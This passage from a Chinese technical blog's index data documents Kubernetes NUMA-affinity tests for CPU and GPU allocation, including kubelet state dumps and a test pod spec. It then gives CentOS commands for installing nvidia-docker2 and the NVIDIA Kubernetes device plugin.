[size=16G] Memory at 39fc00000000 (64-bit, prefetchable) [size=32M] Capabilities: [60] Power Management version 3 Capabilities: [68] MSI: Enable+ Count=1/1 Maskable- 64bit+ Capabilities: [78] Express Endpoint, MSI 00 Capabilities: [100] Virtual Channel Capabilities: [258] L1 PM Substates Capabilities: [128] Power Budgeting \u003c?\u003e Capabilities: [420] Advanced Error Reporting Capabilities: [600] Vendor Specific Information: ID=0001 Rev=1 Len=024 \u003c?\u003e Capabilities: [900] #19 Kernel driver in use: nvidia Kernel modules: nouveau, nvidia_drm, nvidia ","date":"2020-12-29","objectID":"/posts/2020/12/k8s%E5%9F%BA%E4%BA%8Enuma%E4%BA%B2%E5%92%8C%E6%80%A7%E7%9A%84%E8%B5%84%E6%BA%90%E5%88%86%E9%85%8D%E7%89%B9%E6%80%A7%E6%B5%8B%E8%AF%95/:7:2","tags":["K8S"],"title":"K8S基于NUMA亲和性的资源分配特性测试","uri":"/posts/2020/12/k8s%E5%9F%BA%E4%BA%8Enuma%E4%BA%B2%E5%92%8C%E6%80%A7%E7%9A%84%E8%B5%84%E6%BA%90%E5%88%86%E9%85%8D%E7%89%B9%E6%80%A7%E6%B5%8B%E8%AF%95/"},{"categories":["K8S"],"content":"GPU拓扑 nvidia-smi topo -mp GPU0属于NUMA组0，GPU1和GPU2属于NUMA组1 [root@node2 numa_test]# nvidia-smi topo -mp GPU0 GPU1 GPU2 CPU Affinity NUMA Affinity GPU0 X SYS SYS 0-13 0 GPU1 SYS X NODE 14-27 1 GPU2 SYS NODE X 14-27 1 Legend: X = Self SYS = Connection traversing PCIe as well as the SMP interconnect between NUMA nodes (e.g., QPI/UPI) NODE = Connection traversing PCIe as well as the interconnect between PCIe Host Bridges within a NUMA node PHB = Connection traversing PCIe as well as a PCIe Host Bridge (typically the CPU) PXB = Connection traversing multiple PCIe bridges (without traversing the PCIe Host Bridge) PIX = Connection traversing at most a single PCIe bridge ","date":"2020-12-29","objectID":"/posts/2020/12/k8s%E5%9F%BA%E4%BA%8Enuma%E4%BA%B2%E5%92%8C%E6%80%A7%E7%9A%84%E8%B5%84%E6%BA%90%E5%88%86%E9%85%8D%E7%89%B9%E6%80%A7%E6%B5%8B%E8%AF%95/:7:3","tags":["K8S"],"title":"K8S基于NUMA亲和性的资源分配特性测试","uri":"/posts/2020/12/k8s%E5%9F%BA%E4%BA%8Enuma%E4%BA%B2%E5%92%8C%E6%80%A7%E7%9A%84%E8%B5%84%E6%BA%90%E5%88%86%E9%85%8D%E7%89%B9%E6%80%A7%E6%B5%8B%E8%AF%95/"},{"categories":["K8S"],"content":"测试 ","date":"2020-12-29","objectID":"/posts/2020/12/k8s%E5%9F%BA%E4%BA%8Enuma%E4%BA%B2%E5%92%8C%E6%80%A7%E7%9A%84%E8%B5%84%E6%BA%90%E5%88%86%E9%85%8D%E7%89%B9%E6%80%A7%E6%B5%8B%E8%AF%95/:8:0","tags":["K8S"],"title":"K8S基于NUMA亲和性的资源分配特性测试","uri":"/posts/2020/12/k8s%E5%9F%BA%E4%BA%8Enuma%E4%BA%B2%E5%92%8C%E6%80%A7%E7%9A%84%E8%B5%84%E6%BA%90%E5%88%86%E9%85%8D%E7%89%B9%E6%80%A7%E6%B5%8B%E8%AF%95/"},{"categories":["K8S"],"content":"CPU numa亲和性 资源占用和释放：启动pod[3c]，并删除该pod 占用3个cpu后，再释放： [root@node2 kubelet]# cat cpu_manager_state {\"policyName\":\"static\",\"defaultCpuSet\":\"0,4-27\",\"entries\":{\"39b37746-7f5e-4064-b8e1-eebd2bfaa003\":{\"app\":\"1-3\"}},\"checksum\":3300516549} [root@node2 kubelet]# kubectl delete po cpu-numa-batch-pod pod \"cpu-numa-batch-pod\" deleted [root@node2 kubelet]# cat cpu_manager_state {\"policyName\":\"static\",\"defaultCpuSet\":\"0-27\",\"checksum\":273146150} 环境资源未占用 [root@node2 kubelet]# cat cpu_manager_state {\"policyName\":\"static\",\"defaultCpuSet\":\"0,14-27\",\"entries\":{\"c0c5c4b3-3f63-4677-ba68-52da74012371\":{\"app\":\"1-13\"}},\"checksum\":1954249489} 占用一个numa组的cpu资源，14个cpu [root@node2 kubelet]# cat cpu_manager_state {\"policyName\":\"static\",\"defaultCpuSet\":\"0-13\",\"entries\":{\"6c5f3038-adfc-485d-9943-3fd5e825300d\":{\"app\":\"14-27\"}},\"checksum\":3451722052} 启动2个pod，pod1 占用14c，pod2占用12c [root@node2 kubelet]# cat cpu_manager_state {\"policyName\":\"static\",\"defaultCpuSet\":\"0,13\",\"entries\":{\"55784671-0e4e-49e2-b4d6-c0377ca14c81\":{\"app\":\"1-12\"},\"6c5f3038-adfc-485d-9943-3fd5e825300d\":{\"app\":\"14-27\"}},\"checksum\":3558029577} ","date":"2020-12-29","objectID":"/posts/2020/12/k8s%E5%9F%BA%E4%BA%8Enuma%E4%BA%B2%E5%92%8C%E6%80%A7%E7%9A%84%E8%B5%84%E6%BA%90%E5%88%86%E9%85%8D%E7%89%B9%E6%80%A7%E6%B5%8B%E8%AF%95/:8:1","tags":["K8S"],"title":"K8S基于NUMA亲和性的资源分配特性测试","uri":"/posts/2020/12/k8s%E5%9F%BA%E4%BA%8Enuma%E4%BA%B2%E5%92%8C%E6%80%A7%E7%9A%84%E8%B5%84%E6%BA%90%E5%88%86%E9%85%8D%E7%89%B9%E6%80%A7%E6%B5%8B%E8%AF%95/"},{"categories":["K8S"],"content":"GPU+CPU numa亲和性 pod请求2个GPU，0个cpu [root@node2 kubelet]# cat cpu_manager_state {\"policyName\":\"static\",\"defaultCpuSet\":\"0-27\",\"checksum\":273146150}[root@node2 kubelet]# [root@node2 kubelet]# [root@node2 kubelet]# cat device-plugins/kubelet_internal_checkpoint {\"Data\":{\"PodDeviceEntries\":[{\"PodUID\":\"9a15d2b5-c152-46b9-96e0-d57032629e1f\",\"ContainerName\":\"app\",\"ResourceName\":\"nvidia.com/gpu\",\"DeviceIDs\":{\"1\":[\"GPU-9b341c59-f96b-ba85-c137-78c3652fea65\",\"GPU-c1e9f249-b37b-81c2-a8d9-ba5ca0294841\"]},\"AllocResp\":\"CmsKFk5WSURJQV9WSVNJQkxFX0RFVklDRVMSUUdQVS1jMWU5ZjI0OS1iMzdiLTgxYzItYThkOS1iYTVjYTAyOTQ4NDEsR1BVLTliMzQxYzU5LWY5NmItYmE4NS1jMTM3LTc4YzM2NTJmZWE2NRokCg4vZGV2L252aWRpYWN0bBIOL2Rldi9udmlkaWFjdGwaAnJ3GiYKDy9kZXYvbnZpZGlhLXV2bRIPL2Rldi9udmlkaWEtdXZtGgJydxoyChUvZGV2L252aWRpYS11dm0tdG9vbHMSFS9kZXYvbnZpZGlhLXV2bS10b29scxoCcncaLgoTL2Rldi9udmlkaWEtbW9kZXNldBITL2Rldi9udmlkaWEtbW9kZXNldBoCcncaIAoML2Rldi9udmlkaWExEgwvZGV2L252aWRpYTEaAnJ3GiAKDC9kZXYvbnZpZGlhMhIML2Rldi9udmlkaWEyGgJydw==\"}],\"RegisteredDevices\":{\"nvidia.com/gpu\":[\"GPU-77a702db-e37f-3a74-d46d-c5713f66058c\",\"GPU-9b341c59-f96b-ba85-c137-78c3652fea65\",\"GPU-c1e9f249-b37b-81c2-a8d9-ba5ca0294841\"]}},\"Checksum\":2530956716}[root@node2 kubelet]# [root@node2 kubelet]# 查看容器信息 docker inspect，已分配GPU资源 \"Devices\": [ { \"PathOnHost\": \"/dev/nvidia1\", \"PathInContainer\": \"/dev/nvidia1\", \"CgroupPermissions\": \"rw\" }, { \"PathOnHost\": \"/dev/nvidia2\", \"PathInContainer\": \"/dev/nvidia2\", \"CgroupPermissions\": \"rw\" } ] 结果：2个GPU都分配到了同1个numa组，cpu资源无指定则使用全部cpuset pod请求1个GPU，3个cpu [root@node2 kubelet]# cat cpu_manager_state {\"policyName\":\"static\",\"defaultCpuSet\":\"0,4-27\",\"entries\":{\"513cb897-0262-4868-826f-aa943ee45a38\":{\"app\":\"1-3\"}},\"checksum\":1982473279}[root@node2 kubelet]# [root@node2 kubelet]# [root@node2 kubelet]# [root@node2 kubelet]# [root@node2 kubelet]# cat device-plugins/kubelet_internal_checkpoint {\"Data\":{\"PodDeviceEntries\":[{\"PodUID\":\"513cb897-0262-4868-826f-aa943ee45a38\",\"ContainerName\":\"app\",\"ResourceName\":\"nvidia.com/gpu\",\"DeviceIDs\":{\"0\":[\"GPU-77a702db-e37f-3a74-d46d-c5713f66058c\"]},\"AllocResp\":\"CkIKFk5WSURJQV9WSVNJQkxFX0RFVklDRVMSKEdQVS03N2E3MDJkYi1lMzdmLTNhNzQtZDQ2ZC1jNTcxM2Y2NjA1OGMaJAoOL2Rldi9udmlkaWFjdGwSDi9kZXYvbnZpZGlhY3RsGgJydxomCg8vZGV2L252aWRpYS11dm0SDy9kZXYvbnZpZGlhLXV2bRoCcncaMgoVL2Rldi9udmlkaWEtdXZtLXRvb2xzEhUvZGV2L252aWRpYS11dm0tdG9vbHMaAnJ3Gi4KEy9kZXYvbnZpZGlhLW1vZGVzZXQSEy9kZXYvbnZpZGlhLW1vZGVzZXQaAnJ3GiAKDC9kZXYvbnZpZGlhMBIML2Rldi9udmlkaWEwGgJydw==\"}],\"RegisteredDevices\":{\"nvidia.com/gpu\":[\"GPU-77a702db-e37f-3a74-d46d-c5713f66058c\",\"GPU-9b341c59-f96b-ba85-c137-78c3652fea65\",\"GPU-c1e9f249-b37b-81c2-a8d9-ba5ca0294841\"]}},\"Checksum\":133412836}[root@node2 kubelet]# 查看容器信息 docker inspect，分配了GPU0 结果：资源充足时，1个GPU，3个cpu都分配到了numa组0，同时满足numa亲和性 pod请求2个GPU，3个cpu [root@node2 kubelet]# cat cpu_manager_state {\"policyName\":\"static\",\"defaultCpuSet\":\"0-13,17-27\",\"entries\":{\"de6df8b8-a6b7-41cc-97a6-19d0fbd44714\":{\"app\":\"14-16\"}},\"checksum\":3366848516}[root@node2 kubelet]# [root@node2 kubelet]# [root@node2 kubelet]# [root@node2 kubelet]# cat device-plugins/kubelet_internal_checkpoint {\"Data\":{\"PodDeviceEntries\":[{\"PodUID\":\"de6df8b8-a6b7-41cc-97a6-19d0fbd44714\",\"ContainerName\":\"app\",\"ResourceName\":\"nvidia.com/gpu\",\"DeviceIDs\":{\"1\":[\"GPU-9b341c59-f96b-ba85-c137-78c3652fea65\",\"GPU-c1e9f249-b37b-81c2-a8d9-ba5ca0294841\"]},\"AllocResp\":\"CmsKFk5WSURJQV9WSVNJQkxFX0RFVklDRVMSUUdQVS05YjM0MWM1OS1mOTZiLWJhODUtYzEzNy03OGMzNjUyZmVhNjUsR1BVLWMxZTlmMjQ5LWIzN2ItODFjMi1hOGQ5LWJhNWNhMDI5NDg0MRokCg4vZGV2L252aWRpYWN0bBIOL2Rldi9udmlkaWFjdGwaAnJ3GiYKDy9kZXYvbnZpZGlhLXV2bRIPL2Rldi9udmlkaWEtdXZtGgJydxoyChUvZGV2L252aWRpYS11dm0tdG9vbHMSFS9kZXYvbnZpZGlhLXV2bS10b29scxoCcncaLgoTL2Rldi9udmlkaWEtbW9kZXNldBITL2Rldi9udmlkaWEtbW9kZXNldBoCcncaIAoML2Rldi9udmlkaWExEgwvZGV2L252aWRpYTEaAnJ3GiAKDC9kZXYvbnZpZGlhMhIML2Rldi9udmlkaWEyGgJydw==\"}],\"RegisteredDevices\":{\"nvidia.com/gpu\":[\"GPU-77a702db-e37f-3a74-d46d-c5713f66058c\",\"GPU-9b341c59-f96b-ba85-c137-78c3652fea65\",\"GPU-c1e9f249-b37b-81c2-a8d9-ba5ca0294841\"]}},\"Checksum\":4219022648}[root@","date":"2020-12-29","objectID":"/posts/2020/12/k8s%E5%9F%BA%E4%BA%8Enuma%E4%BA%B2%E5%92%8C%E6%80%A7%E7%9A%84%E8%B5%84%E6%BA%90%E5%88%86%E9%85%8D%E7%89%B9%E6%80%A7%E6%B5%8B%E8%AF%95/:8:2","tags":["K8S"],"title":"K8S基于NUMA亲和性的资源分配特性测试","uri":"/posts/2020/12/k8s%E5%9F%BA%E4%BA%8Enuma%E4%BA%B2%E5%92%8C%E6%80%A7%E7%9A%84%E8%B5%84%E6%BA%90%E5%88%86%E9%85%8D%E7%89%B9%E6%80%A7%E6%B5%8B%E8%AF%95/"},{"categories":["K8S"],"content":"numa资源不足场景测试 cpu某num组资源不足 启动2个pod 启动2个pod pod1：请求0个GPU，12个cpu pod2：请求1个GPU，3个cpu pod1分配到了numa组0，且基本上占满numa组0的cpu资源； 这时pod2再分配资源（cpu和GPU）时，根据numa亲和性策略，要分配到numa组1的cpu和GPU资源 [root@node2 kubelet]# cat cpu_manager_state {\"policyName\":\"static\",\"defaultCpuSet\":\"0,13,17-27\",\"entries\":{\"77025d90-6e46-4a87-ad3a-bf0c02c6713c\":{\"app\":\"1-12\"},\"f21fe02b-e6e2-4d04-9a4a-9e57367fa324\":{\"app\":\"14-16\"}},\"checksum\":874856219}[root@node2 kubelet]# [root@node2 kubelet]# [root@node2 kubelet]# [root@node2 kubelet]# [root@node2 kubelet]# cat device-plugins/kubelet_internal_checkpoint {\"Data\":{\"PodDeviceEntries\":[{\"PodUID\":\"f21fe02b-e6e2-4d04-9a4a-9e57367fa324\",\"ContainerName\":\"app\",\"ResourceName\":\"nvidia.com/gpu\",\"DeviceIDs\":{\"1\":[\"GPU-c1e9f249-b37b-81c2-a8d9-ba5ca0294841\"]},\"AllocResp\":\"CkIKFk5WSURJQV9WSVNJQkxFX0RFVklDRVMSKEdQVS1jMWU5ZjI0OS1iMzdiLTgxYzItYThkOS1iYTVjYTAyOTQ4NDEaJAoOL2Rldi9udmlkaWFjdGwSDi9kZXYvbnZpZGlhY3RsGgJydxomCg8vZGV2L252aWRpYS11dm0SDy9kZXYvbnZpZGlhLXV2bRoCcncaMgoVL2Rldi9udmlkaWEtdXZtLXRvb2xzEhUvZGV2L252aWRpYS11dm0tdG9vbHMaAnJ3Gi4KEy9kZXYvbnZpZGlhLW1vZGVzZXQSEy9kZXYvbnZpZGlhLW1vZGVzZXQaAnJ3GiAKDC9kZXYvbnZpZGlhMhIML2Rldi9udmlkaWEyGgJydw==\"}],\"RegisteredDevices\":{\"nvidia.com/gpu\":[\"GPU-77a702db-e37f-3a74-d46d-c5713f66058c\",\"GPU-9b341c59-f96b-ba85-c137-78c3652fea65\",\"GPU-c1e9f249-b37b-81c2-a8d9-ba5ca0294841\"]}},\"Checksum\":2941906560}[root@node2 kubelet]# [root@node2 kubelet]# 启动2个pod 2 启动2个pod pod1：请求1个GPU，3个cpu, 已占numa组1 pod2：请求1个GPU，12个cpu 第2个pod 9388acc6-a396-4f03-a353-ce153da46aaf 的cpu资源 占用了numa组0和1，gpu资源占用了numa组0，如下 [root@node2 kubelet]# cat cpu_manager_state {\"policyName\":\"static\",\"defaultCpuSet\":\"0-13,17-27\",\"entries\":{\"f21fe02b-e6e2-4d04-9a4a-9e57367fa324\":{\"app\":\"14-16\"}},\"checksum\":2485662466}[root@node2 kubelet]# [root@node2 kubelet]# [root@node2 kubelet]# [root@node2 kubelet]# cat cpu_manager_state {\"policyName\":\"static\",\"defaultCpuSet\":\"0,20-27\",\"entries\":{\"9388acc6-a396-4f03-a353-ce153da46aaf\":{\"app\":\"1-13,17-19\"},\"f21fe02b-e6e2-4d04-9a4a-9e57367fa324\":{\"app\":\"14-16\"}},\"checksum\":4055801500}[root@node2 kubelet]# [root@node2 kubelet]# [root@node2 kubelet]# [root@node2 kubelet]# [root@node2 kubelet]# cat device-plugins/kubelet_internal_checkpoint {\"Data\":{\"PodDeviceEntries\":[{\"PodUID\":\"f21fe02b-e6e2-4d04-9a4a-9e57367fa324\",\"ContainerName\":\"app\",\"ResourceName\":\"nvidia.com/gpu\",\"DeviceIDs\":{\"1\":[\"GPU-c1e9f249-b37b-81c2-a8d9-ba5ca0294841\"]},\"AllocResp\":\"CkIKFk5WSURJQV9WSVNJQkxFX0RFVklDRVMSKEdQVS1jMWU5ZjI0OS1iMzdiLTgxYzItYThkOS1iYTVjYTAyOTQ4NDEaJAoOL2Rldi9udmlkaWFjdGwSDi9kZXYvbnZpZGlhY3RsGgJydxomCg8vZGV2L252aWRpYS11dm0SDy9kZXYvbnZpZGlhLXV2bRoCcncaMgoVL2Rldi9udmlkaWEtdXZtLXRvb2xzEhUvZGV2L252aWRpYS11dm0tdG9vbHMaAnJ3Gi4KEy9kZXYvbnZpZGlhLW1vZGVzZXQSEy9kZXYvbnZpZGlhLW1vZGVzZXQaAnJ3GiAKDC9kZXYvbnZpZGlhMhIML2Rldi9udmlkaWEyGgJydw==\"},{\"PodUID\":\"9388acc6-a396-4f03-a353-ce153da46aaf\",\"ContainerName\":\"app\",\"ResourceName\":\"nvidia.com/gpu\",\"DeviceIDs\":{\"0\":[\"GPU-77a702db-e37f-3a74-d46d-c5713f66058c\"]},\"AllocResp\":\"CkIKFk5WSURJQV9WSVNJQkxFX0RFVklDRVMSKEdQVS03N2E3MDJkYi1lMzdmLTNhNzQtZDQ2ZC1jNTcxM2Y2NjA1OGMaJAoOL2Rldi9udmlkaWFjdGwSDi9kZXYvbnZpZGlhY3RsGgJydxomCg8vZGV2L252aWRpYS11dm0SDy9kZXYvbnZpZGlhLXV2bRoCcncaMgoVL2Rldi9udmlkaWEtdXZtLXRvb2xzEhUvZGV2L252aWRpYS11dm0tdG9vbHMaAnJ3Gi4KEy9kZXYvbnZpZGlhLW1vZGVzZXQSEy9kZXYvbnZpZGlhLW1vZGVzZXQaAnJ3GiAKDC9kZXYvbnZpZGlhMBIML2Rldi9udmlkaWEwGgJydw==\"}],\"RegisteredDevices\":{\"nvidia.com/gpu\":[\"GPU-77a702db-e37f-3a74-d46d-c5713f66058c\",\"GPU-9b341c59-f96b-ba85-c137-78c3652fea65\",\"GPU-c1e9f249-b37b-81c2-a8d9-ba5ca0294841\"]}},\"Checksum\":4148283274}[root@node2 kubelet]# [root@node2 kubelet]# [root@node2 kubelet]# 此时的拓扑管理器的策略结果输出如下，虽然有部分cpu和gpu不在同一个numa组，认为cpu和gpu的合并分配结果仍满足numa亲和性 Dec 29 15:13:13 node2 kubelet[117175]: I1229 15:13:13.740680 117175 topology_manager.go:187] [topologymanager] Topology Admit Handler Dec 29 15:13:13 node2 kubelet[117175]: I1229 15:13:13.740755 117175 scope_container.go:80] [topologymanager] TopologyHints for pod '16cpu-numa-batch-pod_default(9388acc6-a396-4f03-a353-ce153da46aaf)', con","date":"2020-12-29","objectID":"/posts/2020/12/k8s%E5%9F%BA%E4%BA%8Enuma%E4%BA%B2%E5%92%8C%E6%80%A7%E7%9A%84%E8%B5%84%E6%BA%90%E5%88%86%E9%85%8D%E7%89%B9%E6%80%A7%E6%B5%8B%E8%AF%95/:8:3","tags":["K8S"],"title":"K8S基于NUMA亲和性的资源分配特性测试","uri":"/posts/2020/12/k8s%E5%9F%BA%E4%BA%8Enuma%E4%BA%B2%E5%92%8C%E6%80%A7%E7%9A%84%E8%B5%84%E6%BA%90%E5%88%86%E9%85%8D%E7%89%B9%E6%80%A7%E6%B5%8B%E8%AF%95/"},{"categories":["K8S"],"content":"附录 ","date":"2020-12-29","objectID":"/posts/2020/12/k8s%E5%9F%BA%E4%BA%8Enuma%E4%BA%B2%E5%92%8C%E6%80%A7%E7%9A%84%E8%B5%84%E6%BA%90%E5%88%86%E9%85%8D%E7%89%B9%E6%80%A7%E6%B5%8B%E8%AF%95/:9:0","tags":["K8S"],"title":"K8S基于NUMA亲和性的资源分配特性测试","uri":"/posts/2020/12/k8s%E5%9F%BA%E4%BA%8Enuma%E4%BA%B2%E5%92%8C%E6%80%A7%E7%9A%84%E8%B5%84%E6%BA%90%E5%88%86%E9%85%8D%E7%89%B9%E6%80%A7%E6%B5%8B%E8%AF%95/"},{"categories":["K8S"],"content":"kubelet numa拓扑亲和性资源分配方案： Kubernetes Topology Manager Moves to Beta - Align Up! ","date":"2020-12-29","objectID":"/posts/2020/12/k8s%E5%9F%BA%E4%BA%8Enuma%E4%BA%B2%E5%92%8C%E6%80%A7%E7%9A%84%E8%B5%84%E6%BA%90%E5%88%86%E9%85%8D%E7%89%B9%E6%80%A7%E6%B5%8B%E8%AF%95/:9:1","tags":["K8S"],"title":"K8S基于NUMA亲和性的资源分配特性测试","uri":"/posts/2020/12/k8s%E5%9F%BA%E4%BA%8Enuma%E4%BA%B2%E5%92%8C%E6%80%A7%E7%9A%84%E8%B5%84%E6%BA%90%E5%88%86%E9%85%8D%E7%89%B9%E6%80%A7%E6%B5%8B%E8%AF%95/"},{"categories":["K8S"],"content":"测试pod 配置 16cpu-2gpu-numa-kubebatch-pod.yaml apiVersion:v1kind:Podmetadata:name:16cpu-2gpu-numa-kubebatch-podlabels:app:myappversion:v1spec:schedulerName:kube-batchcontainers:- name:appimage:docker.io/busybox:latestimagePullPolicy:IfNotPresentcommand:[\"sleep\",\"3600\"]securityContext:privileged:trueresources:limits:cpu:\"16\"memory:\"100Mi\"nvidia.com/gpu:2requests:cpu:\"16\"memory:\"100Mi\"nvidia.com/gpu:2affinity:nodeAffinity:requiredDuringSchedulingIgnoredDuringExecution:# 硬策略nodeSelectorTerms:- matchExpressions:- key:node-role.kubernetes.io/nodeoperator:NotInvalues:- \"true\" ","date":"2020-12-29","objectID":"/posts/2020/12/k8s%E5%9F%BA%E4%BA%8Enuma%E4%BA%B2%E5%92%8C%E6%80%A7%E7%9A%84%E8%B5%84%E6%BA%90%E5%88%86%E9%85%8D%E7%89%B9%E6%80%A7%E6%B5%8B%E8%AF%95/:9:2","tags":["K8S"],"title":"K8S基于NUMA亲和性的资源分配特性测试","uri":"/posts/2020/12/k8s%E5%9F%BA%E4%BA%8Enuma%E4%BA%B2%E5%92%8C%E6%80%A7%E7%9A%84%E8%B5%84%E6%BA%90%E5%88%86%E9%85%8D%E7%89%B9%E6%80%A7%E6%B5%8B%E8%AF%95/"},{"categories":["K8S"],"content":"Centos 7环境下，安装NVIDIA Container和K8S的GPU插件的操作命令","date":"2020-12-25","objectID":"/posts/2020/12/%E5%AE%89%E8%A3%85nvidia-docker2nvidia-container-v2%E5%92%8Cnvidia-k8s-gpu%E6%8F%92%E4%BB%B6/","tags":["Docker","K8S"],"title":"安装NVIDIA Docker2(NVIDIA Container V2)和NVIDIA K8S-GPU插件","uri":"/posts/2020/12/%E5%AE%89%E8%A3%85nvidia-docker2nvidia-container-v2%E5%92%8Cnvidia-k8s-gpu%E6%8F%92%E4%BB%B6/"},{"categories":["K8S"],"content":"Centos 7环境下，安装NVIDIA Container和K8S的GPU插件的操作命令 Setting up NVIDIA Container Toolkit NVIDIA Docker参考NVIDIA官网教程 NVIDIA Container Toolkit 官方安装说明 NVIDIA k8s-device-plugin 参考项目地址 k8s-device-plugin ","date":"2020-12-25","objectID":"/posts/2020/12/%E5%AE%89%E8%A3%85nvidia-docker2nvidia-container-v2%E5%92%8Cnvidia-k8s-gpu%E6%8F%92%E4%BB%B6/:0:0","tags":["Docker","K8S"],"title":"安装NVIDIA Docker2(NVIDIA Container V2)和NVIDIA K8S-GPU插件","uri":"/posts/2020/12/%E5%AE%89%E8%A3%85nvidia-docker2nvidia-container-v2%E5%92%8Cnvidia-k8s-gpu%E6%8F%92%E4%BB%B6/"},{"categories":["K8S"],"content":"NVIDIA Docker依赖 sudo yum install -y tar bzip2 make automake gcc gcc-c++ vim pciutils elfutils-libelf-devel libglvnd-devel iptables ### Setup the official Docker CE repository: sudo yum-config-manager --add-repo=https://download.docker.com/linux/centos/docker-ce.repo ### Now you can observe the packages available from the docker-ce repo: sudo yum repolist -v #### 生成yum缓存 sudo yum makecache ","date":"2020-12-25","objectID":"/posts/2020/12/%E5%AE%89%E8%A3%85nvidia-docker2nvidia-container-v2%E5%92%8Cnvidia-k8s-gpu%E6%8F%92%E4%BB%B6/:1:0","tags":["Docker","K8S"],"title":"安装NVIDIA Docker2(NVIDIA Container V2)和NVIDIA K8S-GPU插件","uri":"/posts/2020/12/%E5%AE%89%E8%A3%85nvidia-docker2nvidia-container-v2%E5%92%8Cnvidia-k8s-gpu%E6%8F%92%E4%BB%B6/"},{"categories":["K8S"],"content":"NVIDIA Docker2 ### Clear installed old version package # rpm -qa|grep nvidia # yum info installed |grep nvidia sudo yum remove -y nvidia-docker sudo yum remove -y nvidia-docker2 ## 如果原有版本使用rpm方式安装，则清理rpm包 rpm -qa|grep nvidia |grep -E \"libnvidia-container|nvidia-container-runtime\" |xargs rpm -e ### Setup the stable repository and the GPG key: distribution=$(. /etc/os-release;echo $ID$VERSION_ID) \\ \u0026\u0026 curl -s -L https://nvidia.github.io/nvidia-docker/$distribution/nvidia-docker.repo | sudo tee /etc/yum.repos.d/nvidia-docker.repo sudo yum clean expire-cache ### 生成yum缓存 #sudo yum makecache sudo yum install -y nvidia-docker2 ### Restart the Docker daemon to complete the installation after setting the default runtime: sudo systemctl restart docker ","date":"2020-12-25","objectID":"/posts/2020/12/%E5%AE%89%E8%A3%85nvidia-docker2nvidia-container-v2%E5%92%8Cnvidia-k8s-gpu%E6%8F%92%E4%BB%B6/:2:0","tags":["Docker","K8S"],"title":"安装NVIDIA Docker2(NVIDIA Container V2)和NVIDIA K8S-GPU插件","uri":"/posts/2020/12/%E5%AE%89%E8%A3%85nvidia-docker2nvidia-container-v2%E5%92%8Cnvidia-k8s-gpu%E6%8F%92%E4%BB%B6/"},{"categories":["K8S"],"content":"验证 ### t this point, a working setup can be tested by running a base CUDA container: sudo docker run --rm --gpus all nvidia/cuda:11.0-base nvidia-smi 安装成功，如下结果 +-----------------------------------------------------------------------------+ | NVIDIA-SMI 450.80.02 Driver Version: 450.80.02 CUDA Version: 11.0 | |-------------------------------+----------------------+----------------------+ | GPU Name Persistence-M| Bus-Id Disp.A | Volatile Uncorr. ECC | | Fan Temp Perf Pwr:Usage/Cap| Memory-Usage | GPU-Util Compute M. | | | | MIG M. | |===============================+======================+======================| | 0 Tesla P100-PCIE... Off | 00000000:3B:00.0 Off | Off | | N/A 37C P0 33W / 250W | 0MiB / 16280MiB | 0% Default | | | | N/A | +-------------------------------+----------------------+----------------------+ | 1 Tesla P100-PCIE... Off | 00000000:86:00.0 Off | Off | | N/A 37C P0 32W / 250W | 0MiB / 16280MiB | 0% Default | | | | N/A | +-------------------------------+----------------------+----------------------+ | 2 Tesla P100-PCIE... Off | 00000000:D8:00.0 Off | Off | | N/A 36C P0 27W / 250W | 0MiB / 16280MiB | 4% Default | | | | N/A | +-------------------------------+----------------------+----------------------+ +-----------------------------------------------------------------------------+ | Processes: | | GPU GI CI PID Type Process name GPU Memory | | ID ID Usage | |=============================================================================| | No running processes found | +-----------------------------------------------------------------------------+ ","date":"2020-12-25","objectID":"/posts/2020/12/%E5%AE%89%E8%A3%85nvidia-docker2nvidia-container-v2%E5%92%8Cnvidia-k8s-gpu%E6%8F%92%E4%BB%B6/:3:0","tags":["Docker","K8S"],"title":"安装NVIDIA Docker2(NVIDIA Container V2)和NVIDIA K8S-GPU插件","uri":"/posts/2020/12/%E5%AE%89%E8%A3%85nvidia-docker2nvidia-container-v2%E5%92%8Cnvidia-k8s-gpu%E6%8F%92%E4%BB%B6/"},{"categories":["K8S"],"content":"NVIDIA K8S Device plugin 这里使用镜像方式，更多方式，参考k8s-device-plugin ","date":"2020-12-25","objectID":"/posts/2020/12/%E5%AE%89%E8%A3%85nvidia-docker2nvidia-container-v2%E5%92%8Cnvidia-k8s-gpu%E6%8F%92%E4%BB%B6/:4:0","tags":["Docker","K8S"],"title":"安装NVIDIA Docker2(NVIDIA Container V2)和NVIDIA K8S-GPU插件","uri":"/posts/2020/12/%E5%AE%89%E8%A3%85nvidia-docker2nvidia-container-v2%E5%92%8Cnvidia-k8s-gpu%E6%8F%92%E4%BB%B6/"},{"categories":["K8S"],"content":"拉取镜像 docker pull nvidia/k8s-device-plugin:v0.7.3 docker tag nvidia/k8s-device-plugin:v0.7.3 nvidia/k8s-device-plugin:devel ","date":"2020-12-25","objectID":"/posts/2020/12/%E5%AE%89%E8%A3%85nvidia-docker2nvidia-container-v2%E5%92%8Cnvidia-k8s-gpu%E6%8F%92%E4%BB%B6/:4:1","tags":["Docker","K8S"],"title":"安装NVIDIA Docker2(NVIDIA Container V2)和NVIDIA K8S-GPU插件","uri":"/posts/2020/12/%E5%AE%89%E8%A3%85nvidia-docker2nvidia-container-v2%E5%92%8Cnvidia-k8s-gpu%E6%8F%92%E4%BB%B6/"},{"categories":["K8S"],"content":"运行镜像 以下方式2选1： Without compatibility for the CPUManager static policy: docker run \\ -it \\ --security-opt=no-new-privileges \\ --cap-drop=ALL \\ --network=none \\ -v /var/lib/kubelet/device-plugins:/var/lib/kubelet/device-plugins \\ nvidia/k8s-device-plugin:devel With compatibility for the CPUManager static policy: docker run \\ -it \\ --privileged \\ --network=none \\ -v /var/lib/kubelet/device-plugins:/var/lib/kubelet/device-plugins \\ nvidia/k8s-device-plugin:devel --pass-device-specs ","date":"2020-12-25","objectID":"/posts/2020/12/%E5%AE%89%E8%A3%85nvidia-docker2nvidia-container-v2%E5%92%8Cnvidia-k8s-gpu%E6%8F%92%E4%BB%B6/:4:2","tags":["Docker","K8S"],"title":"安装NVIDIA Docker2(NVIDIA Container V2)和NVIDIA K8S-GPU插件","uri":"/posts/2020/12/%E5%AE%89%E8%A3%85nvidia-docker2nvidia-container-v2%E5%92%8Cnvidia-k8s-gpu%E6%8F%92%E4%BB%B6/"},{"categories":["K8S"],"content":"附录 手动安装nvidia-docker(在有外网机器上面进行)， 未测试验证，仅供参考 distribution=$(. /etc/os-release;echo $ID$VERSION_ID) curl -s -L https://nvidia.github.io/nvidia-docker/$distribution/nvidia-docker.repo | sudo tee /etc/yum.repos.d/nvidia-docker.repo yum install --downloadonly nvidia-docker2 